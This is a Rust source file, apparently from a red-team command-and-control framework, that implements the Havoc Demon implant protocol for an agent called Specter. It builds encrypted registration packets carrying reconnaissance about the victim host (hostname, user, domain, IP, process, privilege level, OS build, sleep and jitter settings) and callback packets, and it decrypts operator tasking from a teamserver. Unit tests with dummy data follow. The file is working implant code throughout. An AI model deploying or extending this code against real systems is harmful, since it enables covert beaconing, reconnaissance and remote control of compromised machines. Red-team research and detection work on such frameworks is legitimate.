//! Demon binary protocol serialization for the Specter agent.
//!
//! Builds `DEMON_INIT` registration packets and parses teamserver acknowledgement
//! responses, matching the Havoc Demon wire format byte-for-byte.

use red_cell_common::crypto::{
    AGENT_IV_LENGTH, AGENT_KEY_LENGTH, AgentCryptoMaterial, decrypt_agent_data_at_offset,
    encrypt_agent_data, encrypt_agent_data_at_offset,
};
use red_cell_common::demon::{DemonCommand, DemonEnvelope};

use crate::error::SpecterError;

/// Metadata about the host environment, collected at startup and sent during init.
#[derive(Debug, Clone)]
pub struct AgentMetadata {
    /// Hostname of the machine.
    pub hostname: String,
    /// Username running the agent process.
    pub username: String,
    /// Domain name (or workgroup).
    pub domain_name: String,
    /// Internal IP address.
    pub internal_ip: String,
    /// Full path to the agent process executable (UTF-16LE on wire).
    pub process_path: String,
    /// Process ID.
    pub process_pid: u32,
    /// Thread ID.
    pub process_tid: u32,
    /// Parent process ID.
    pub process_ppid: u32,
    /// Process architecture (0=unknown, 1=x86, 2=x64, 3=IA64).
    pub process_arch: u32,
    /// Whether the agent is running elevated.
    pub elevated: bool,
    /// Base address of the agent module.
    pub base_address: u64,
    /// OS version fields.
    pub os_major: u32,
    /// OS minor version.
    pub os_minor: u32,
    /// OS product type.
    pub os_product_type: u32,
    /// OS service pack level.
    pub os_service_pack: u32,
    /// OS build number.
    pub os_build: u32,
    /// OS architecture (0=x86, 9=x64, 5=ARM, 12=ARM64, 6=Itanium).
    pub os_arch: u32,
    /// Sleep delay in milliseconds.
    pub sleep_delay: u32,
    /// Sleep jitter percentage.
    pub sleep_jitter: u32,
    /// Kill date as a Unix timestamp (0 = none).
    pub kill_date: u64,
    /// Working hours bitmask (0 = disabled).
    pub working_hours: i32,
}

/// Build the `DEMON_INIT` registration packet.
///
/// Wire layout:
/// ```text
/// [ DemonHeader: size(4) | magic(4) | agent_id(4) ]
/// [ command_id(4) = 99 (DEMON_INIT) ]
/// [ request_id(4) = 0 ]
/// [ AES key (32 bytes, unencrypted) ]
/// [ AES IV  (16 bytes, unencrypted) ]
/// [ AES-256-CTR encrypted metadata payload ]
/// ```
pub fn build_init_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    metadata: &AgentMetadata,
) -> Result<Vec<u8>, SpecterError> {
    let plaintext = serialize_init_metadata(agent_id, metadata);
    let encrypted = encrypt_agent_data(&crypto.key, &crypto.iv, &plaintext)?;

    // Payload = command_id + request_id + key + iv + encrypted_metadata
    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + encrypted.len();
    let mut payload = Vec::with_capacity(payload_len);
    payload.extend_from_slice(&u32::from(DemonCommand::DemonInit).to_be_bytes());
    payload.extend_from_slice(&0_u32.to_be_bytes()); // request_id = 0
    payload.extend_from_slice(&crypto.key);
    payload.extend_from_slice(&crypto.iv);
    payload.extend_from_slice(&encrypted);

    let envelope = DemonEnvelope::new(agent_id, payload)?;
    Ok(envelope.to_bytes())
}

/// Build a callback packet with encrypted payload at the given CTR block offset.
///
/// Wire layout:
/// ```text
/// [ DemonHeader: size(4) | magic(4) | agent_id(4) ]
/// [ AES-256-CTR encrypted payload at block_offset ]
/// ```
///
/// The encrypted region contains one or more Demon packages:
/// ```text
/// [ command_id(4) | request_id(4) | payload_len(4) | payload_bytes ]
/// ```
pub fn build_callback_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    block_offset: u64,
    command_id: u32,
    request_id: u32,
    callback_payload: &[u8],
) -> Result<Vec<u8>, SpecterError> {
    // Build the encrypted callback body: payload_len(4) + payload.
    // The top-level command_id and request_id remain in the clear.
    let mut plaintext = Vec::with_capacity(4 + callback_payload.len());
    let payload_len = u32::try_from(callback_payload.len()).map_err(|_| {
        SpecterError::Protocol(red_cell_common::demon::DemonProtocolError::LengthOverflow {
            context: "callback payload",
            length: callback_payload.len(),
        })
    })?;
    plaintext.extend_from_slice(&payload_len.to_be_bytes());
    plaintext.extend_from_slice(callback_payload);

    let encrypted =
        encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, block_offset, &plaintext)?;
    let mut body = Vec::with_capacity(8 + encrypted.len());
    body.extend_from_slice(&command_id.to_be_bytes());
    body.extend_from_slice(&request_id.to_be_bytes());
    body.extend_from_slice(&encrypted);

    let envelope = DemonEnvelope::new(agent_id, body)?;
    Ok(envelope.to_bytes())
}

/// Parse the teamserver's init acknowledgement response.
///
/// The response body is the AES-256-CTR encrypted agent_id (4 bytes LE).
/// After a successful init, the teamserver encrypts the agent_id at CTR offset 0
/// using either the raw registration key material or HKDF-derived session keys,
/// depending on listener configuration. The agent validates the decrypted value
/// matches its own ID.
///
/// Returns the CTR block offset consumed by the ACK (1 block for 4 bytes).
pub fn parse_init_ack(
    response_body: &[u8],
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
) -> Result<u64, SpecterError> {
    if response_body.is_empty() {
        return Err(SpecterError::InvalidResponse("empty init ACK body"));
    }

    let decrypted =
        red_cell_common::crypto::decrypt_agent_data(&crypto.key, &crypto.iv, response_body)?;

    if decrypted.len() < 4 {
        return Err(SpecterError::InvalidResponse("init ACK too short"));
    }

    let acked_id = u32::from_le_bytes(
        decrypted[..4]
            .try_into()
            .map_err(|_| SpecterError::InvalidResponse("init ACK agent_id parse failed"))?,
    );

    if acked_id != agent_id {
        return Err(SpecterError::InvalidResponse("init ACK agent_id does not match our agent_id"));
    }

    // The ACK consumes 1 CTR block (ceil(4/16) = 1)
    Ok(red_cell_common::crypto::ctr_blocks_for_len(response_body.len()))
}

/// Decrypted tasking bytes returned from a callback response.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TaskingResponse {
    /// Raw decrypted tasking bytes.
    pub decrypted: Vec<u8>,
    /// The next receive-side CTR block offset after consuming this response.
    pub next_recv_ctr_offset: u64,
}

/// Decrypt a callback response and calculate the next receive CTR block offset.
///
/// The teamserver may return either a full Demon envelope or only the encrypted
/// payload body. This parser accepts either form and returns the raw decrypted
/// bytes for command dispatch.
pub fn parse_tasking_response(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    recv_ctr_offset: u64,
    response_body: &[u8],
) -> Result<TaskingResponse, SpecterError> {
    if response_body.is_empty() {
        return Ok(TaskingResponse {
            decrypted: Vec::new(),
            next_recv_ctr_offset: recv_ctr_offset,
        });
    }

    let encrypted_payload = match DemonEnvelope::from_bytes(response_body) {
        Ok(envelope) => {
            if envelope.header.agent_id != agent_id {
                return Err(SpecterError::InvalidResponse("task envelope agent_id mismatch"));
            }
            envelope.payload
        }
        Err(_) => response_body.to_vec(),
    };

    let decrypted =
        decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &encrypted_payload)?;

    Ok(TaskingResponse {
        decrypted,
        next_recv_ctr_offset: recv_ctr_offset + ctr_blocks_for_len(encrypted_payload.len()),
    })
}

/// Extension flag: request monotonic (non-legacy) AES-CTR mode from the teamserver.
///
/// When set in the trailing extension flags `u32`, the teamserver registers the agent
/// with `legacy_ctr = false`, advancing the CTR block offset across packets instead of
/// resetting to 0 for each message.
const INIT_EXT_MONOTONIC_CTR: u32 = 1 << 0;

/// Serialize the init metadata fields to a big-endian byte buffer for encryption.
///
/// Specter appends a trailing `u32` extension flags field after the standard metadata,
/// requesting monotonic CTR mode.  Legacy Demon agents omit this field; the teamserver
/// defaults to legacy mode when it is absent.
fn serialize_init_metadata(agent_id: u32, m: &AgentMetadata) -> Vec<u8> {
    let mut buf = Vec::with_capacity(256);

    // Agent ID (duplicate for validation)
    buf.extend_from_slice(&agent_id.to_be_bytes());

    // Length-prefixed UTF-8 strings
    write_length_prefixed_string(&mut buf, &m.hostname);
    write_length_prefixed_string(&mut buf, &m.username);
    write_length_prefixed_string(&mut buf, &m.domain_name);
    write_length_prefixed_string(&mut buf, &m.internal_ip);

    // Process path as length-prefixed UTF-16LE
    write_length_prefixed_utf16le(&mut buf, &m.process_path);

    // Fixed-width fields (all big-endian)
    buf.extend_from_slice(&m.process_pid.to_be_bytes());
    buf.extend_from_slice(&m.process_tid.to_be_bytes());
    buf.extend_from_slice(&m.process_ppid.to_be_bytes());
    buf.extend_from_slice(&m.process_arch.to_be_bytes());
    buf.extend_from_slice(&(u32::from(m.elevated)).to_be_bytes());
    buf.extend_from_slice(&m.base_address.to_be_bytes());
    buf.extend_from_slice(&m.os_major.to_be_bytes());
    buf.extend_from_slice(&m.os_minor.to_be_bytes());
    buf.extend_from_slice(&m.os_product_type.to_be_bytes());
    buf.extend_from_slice(&m.os_service_pack.to_be_bytes());
    buf.extend_from_slice(&m.os_build.to_be_bytes());
    buf.extend_from_slice(&m.os_arch.to_be_bytes());
    buf.extend_from_slice(&m.sleep_delay.to_be_bytes());
    buf.extend_from_slice(&m.sleep_jitter.to_be_bytes());
    buf.extend_from_slice(&m.kill_date.to_be_bytes());
    buf.extend_from_slice(&m.working_hours.to_be_bytes());

    // Specter extension: request monotonic CTR mode.
    buf.extend_from_slice(&INIT_EXT_MONOTONIC_CTR.to_be_bytes());

    buf
}

/// Write a length-prefixed UTF-8 string (4-byte BE length + raw bytes).
fn write_length_prefixed_string(buf: &mut Vec<u8>, s: &str) {
    let bytes = s.as_bytes();
    #[allow(clippy::cast_possible_truncation)]
    let len = bytes.len() as u32;
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(bytes);
}

/// Write a length-prefixed UTF-16LE string (4-byte BE length of byte payload + UTF-16LE bytes).
fn write_length_prefixed_utf16le(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u16> = s.encode_utf16().collect();
    let byte_len = utf16.len() * 2;
    #[allow(clippy::cast_possible_truncation)]
    let len = byte_len as u32;
    buf.extend_from_slice(&len.to_be_bytes());
    for code_unit in &utf16 {
        buf.extend_from_slice(&code_unit.to_le_bytes());
    }
}

/// Calculate the number of CTR blocks consumed by `byte_len` bytes.
pub fn ctr_blocks_for_len(byte_len: usize) -> u64 {
    red_cell_common::crypto::ctr_blocks_for_len(byte_len)
}

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::crypto::{
        decrypt_agent_data, encrypt_agent_data_at_offset, generate_agent_crypto_material,
    };
    use red_cell_common::demon::DEMON_MAGIC_VALUE;

    fn test_metadata() -> AgentMetadata {
        AgentMetadata {
            hostname: "DESKTOP-TEST".into(),
            username: "testuser".into(),
            domain_name: "WORKGROUP".into(),
            internal_ip: "192.168.1.100".into(),
            process_path: "C:\\Windows\\System32\\notepad.exe".into(),
            process_pid: 1234,
            process_tid: 5678,
            process_ppid: 900,
            process_arch: 2, // x64
            elevated: false,
            base_address: 0x7FF6_0000_0000,
            os_major: 10,
            os_minor: 0,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: 19045,
            os_arch: 9, // x64
            sleep_delay: 5000,
            sleep_jitter: 10,
            kill_date: 0,
            working_hours: 0,
        }
    }

    #[test]
    fn build_init_packet_has_correct_header() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xAABB_CCDD;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");

        // Parse the envelope
        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse envelope");
        assert_eq!(envelope.header.magic, DEMON_MAGIC_VALUE);
        assert_eq!(envelope.header.agent_id, agent_id);

        // First 8 bytes of payload = command_id + request_id
        let command_id = u32::from_be_bytes(envelope.payload[0..4].try_into().expect("cmd"));
        let request_id = u32::from_be_bytes(envelope.payload[4..8].try_into().expect("req"));
        assert_eq!(command_id, u32::from(DemonCommand::DemonInit));
        assert_eq!(request_id, 0);
    }

    #[test]
    fn build_init_packet_contains_key_and_iv() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1234_5678;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        // After command_id(4) + request_id(4) comes key(32) + iv(16)
        let key_start = 8;
        let key_end = key_start + AGENT_KEY_LENGTH;
        let iv_end = key_end + AGENT_IV_LENGTH;
        assert_eq!(&envelope.payload[key_start..key_end], &crypto.key);
        assert_eq!(&envelope.payload[key_end..iv_end], &crypto.iv);
    }

    #[test]
    fn init_packet_encrypted_payload_decrypts_correctly() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xDEAD_CAFE;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        let encrypted_start = 8 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH;
        let encrypted = &envelope.payload[encrypted_start..];
        let decrypted = decrypt_agent_data(&crypto.key, &crypto.iv, encrypted).expect("decrypt");

        // First 4 bytes of decrypted = agent_id (BE)
        let parsed_id = u32::from_be_bytes(decrypted[0..4].try_into().expect("id"));
        assert_eq!(parsed_id, agent_id);
    }

    #[test]
    fn init_metadata_hostname_round_trips() {
        let agent_id = 0x1111_2222;
        let metadata = test_metadata();
        let buf = serialize_init_metadata(agent_id, &metadata);

        // Skip agent_id (4 bytes), read hostname length-prefixed string
        let hostname_len = u32::from_be_bytes(buf[4..8].try_into().expect("len")) as usize;
        let hostname = std::str::from_utf8(&buf[8..8 + hostname_len]).expect("utf8");
        assert_eq!(hostname, "DESKTOP-TEST");
    }

    #[test]
    fn parse_init_ack_valid() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id: u32 = 0xBEEF_CAFE;

        // Simulate what the teamserver sends: encrypt agent_id (LE) at offset 0
        let ack_plaintext = agent_id.to_le_bytes();
        let ack_body =
            red_cell_common::crypto::encrypt_agent_data(&crypto.key, &crypto.iv, &ack_plaintext)
                .expect("encrypt");

        let blocks = parse_init_ack(&ack_body, agent_id, &crypto).expect("parse");
        assert!(blocks >= 1);
    }

    #[test]
    fn parse_init_ack_valid_with_hkdf_session_crypto() {
        let raw_crypto = generate_agent_crypto_material().expect("keygen");
        let session_crypto = red_cell_common::crypto::derive_session_keys(
            &raw_crypto.key,
            &raw_crypto.iv,
            b"listener-init-secret",
        )
        .expect("derive session keys");
        let agent_id: u32 = 0xBEEF_CAFE;

        let ack_plaintext = agent_id.to_le_bytes();
        let ack_body = red_cell_common::crypto::encrypt_agent_data(
            &session_crypto.key,
            &session_crypto.iv,
            &ack_plaintext,
        )
        .expect("encrypt");

        let blocks = parse_init_ack(&ack_body, agent_id, &session_crypto).expect("parse");
        assert!(blocks >= 1);
    }

    #[test]
    fn parse_init_ack_wrong_agent_id_fails() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id: u32 = 0xBEEF_CAFE;
        let wrong_id: u32 = 0x1111_1111;

        let ack_plaintext = wrong_id.to_le_bytes();
        let ack_body =
            red_cell_common::crypto::encrypt_agent_data(&crypto.key, &crypto.iv, &ack_plaintext)
                .expect("encrypt");

        let result = parse_init_ack(&ack_body, agent_id, &crypto);
        assert!(result.is_err());
    }

    #[test]
    fn parse_init_ack_empty_body_fails() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let result = parse_init_ack(&[], 0x1234, &crypto);
        assert!(result.is_err());
    }

    #[test]
    fn build_callback_packet_roundtrips() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xAAAA_BBBB;
        let command_id = u32::from(DemonCommand::CommandCheckin);
        let request_id = 42_u32;
        let payload_data = b"hello";

        let packet =
            build_callback_packet(agent_id, &crypto, 0, command_id, request_id, payload_data)
                .expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        assert_eq!(envelope.header.agent_id, agent_id);
        let cmd = u32::from_be_bytes(envelope.payload[0..4].try_into().expect("cmd"));
        let req = u32::from_be_bytes(envelope.payload[4..8].try_into().expect("req"));
        assert_eq!(cmd, command_id);
        assert_eq!(req, request_id);

        let decrypted =
            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[8..]).expect("decrypt");
        let plen = u32::from_be_bytes(decrypted[0..4].try_into().expect("len")) as usize;
        assert_eq!(&decrypted[4..4 + plen], payload_data);
    }

    #[test]
    fn utf16le_encoding_matches_havoc_format() {
        let mut buf = Vec::new();
        write_length_prefixed_utf16le(&mut buf, "A");
        // 'A' = U+0041 → UTF-16LE = [0x41, 0x00], length = 2 bytes
        assert_eq!(&buf[0..4], &2_u32.to_be_bytes());
        assert_eq!(&buf[4..6], &[0x41, 0x00]);
    }

    #[test]
    fn header_size_field_is_correct() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1234_5678;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");

        // First 4 bytes = size (BE), which equals total_len - 4
        let declared_size = u32::from_be_bytes(packet[0..4].try_into().expect("size"));
        assert_eq!(declared_size as usize, packet.len() - 4);
    }

    #[test]
    fn parse_tasking_response_decrypts_raw_body_and_advances_recv_ctr() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1357_2468;
        let recv_ctr_offset = 5;
        let plaintext = b"queued-tasking".to_vec();
        let encrypted =
            encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &plaintext)
                .expect("encrypt");

        let response =
            parse_tasking_response(agent_id, &crypto, recv_ctr_offset, &encrypted).expect("parse");

        assert_eq!(response.decrypted, plaintext);
        assert_eq!(
            response.next_recv_ctr_offset,
            recv_ctr_offset + ctr_blocks_for_len(encrypted.len())
        );
    }

    #[test]
    fn parse_tasking_response_decrypts_enveloped_body_and_advances_recv_ctr() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x2468_1357;
        let recv_ctr_offset = 9;
        let plaintext = b"command-stream".to_vec();
        let encrypted =
            encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &plaintext)
                .expect("encrypt");
        let envelope = DemonEnvelope::new(agent_id, encrypted.clone()).expect("envelope");

        let response =
            parse_tasking_response(agent_id, &crypto, recv_ctr_offset, &envelope.to_bytes())
                .expect("parse");

        assert_eq!(response.decrypted, plaintext);
        assert_eq!(
            response.next_recv_ctr_offset,
            recv_ctr_offset + ctr_blocks_for_len(encrypted.len())
        );
    }
}
